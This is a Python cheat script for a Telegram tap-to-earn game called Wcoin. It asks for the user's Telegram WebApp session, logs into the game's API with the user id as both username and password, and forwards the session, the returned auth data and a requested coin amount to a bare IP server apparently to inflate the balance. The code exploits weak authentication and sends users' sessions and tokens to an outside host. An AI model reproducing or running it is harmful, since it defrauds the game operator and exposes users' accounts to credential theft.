import os
import pyfiglet
from colorama import Fore, Style, init
import json
import requests
import time 
from urllib.parse import urlparse, parse_qs
from user_agent import generate_user_agent

user_agent = generate_user_agent('android')
headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'x-requested-with': 'org.telegram.plus',
}

init(autoreset=True)

def main_wcoin(session ,amount, key):
    parsed_url = urlparse(session)
    query_params = parse_qs(parsed_url.fragment)
    tgWebAppData = query_params.get('tgWebAppData', [None])[0]
    user_data = parse_qs(tgWebAppData)['user'][0]
    user_data = json.loads(user_data)
    identifier = str(user_data['id'])
    json_data = {
            'identifier':identifier,
            'password': identifier,
        }
    res = requests.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
    r = requests.post('http://213.218.240.167:5000/private',json={'initData':session,'serverData':res,'amount':amount,'key':key})
    return (r.json())
def create_gradient_banner(text):
    banner = pyfiglet.figlet_format(text,font='slant').splitlines()
    colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.RED + Style.BRIGHT]
    total_lines = len(banner)
    section_size = total_lines // len(colors)
    for i, line in enumerate(banner):
        if i < section_size:
            print(colors[0] + line)  # Green
        elif i < section_size * 2:
            print(colors[1] + line)  # Yellow
        else:
            print(colors[2] + line)  # Red

def print_info_box(social_media_usernames):
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTWHITE_EX]
    
    box_width = max(len(social) + len(username) for social, username in social_media_usernames) + 4
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')
    
    for i, (social, username) in enumerate(social_media_usernames):
        color = colors[i % len(colors)]  # Cycle through colors
        print(color + f'| {social}: {username} |')
    
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')

if __name__ == "__main__":
    banner_text = "WHYWETAP"
    os.system('cls' if os.name == 'nt' else 'clear')
    create_gradient_banner(banner_text)
    social_media_usernames = [
        ("CryptoNews", "@ethcryptopia"),
        ("Auto Farming", "@whywetap"),
        ("Auto Farming", "@autominerx"),
        #("", "@"),
        ("Coder", "@demoncratos"),
    ]
    
    print_info_box(social_media_usernames)
    user_input = input("\nEnter Wcoin Session : ")
    balance_input = input("Enter Coin Amount : ")
    key = input("Enter Authorization Key  : ")
    data = main_wcoin(user_input,int(balance_input),key)
    os.system('cls' if os.name == 'nt' else 'clear')
    create_gradient_banner('Done')
    try :
        print(Fore.GREEN + Style.BRIGHT + "=== User Information ===")
        print(Fore.YELLOW + f"Username: {data['username']}")
        print(Fore.CYAN + f"Email: {data['email']}")
        print(Fore.MAGENTA + f"Telegram Username: {data['telegram_username']}")
        print(Fore.BLUE + f"Balance: {data['balance']}") 
        print(Fore.LIGHTWHITE_EX + f"Clicks: {data['clicks']}")
        print(Fore.WHITE + f"Max Energy: {data['max_energy']}")
        print(Fore.GREEN + Style.BRIGHT + f"Created At: {data['createdAt']}")
        print(Fore.GREEN + Style.BRIGHT + "========================")
    
    except:
        print(Fore.RED + Style.BRIGHT + data['error'])
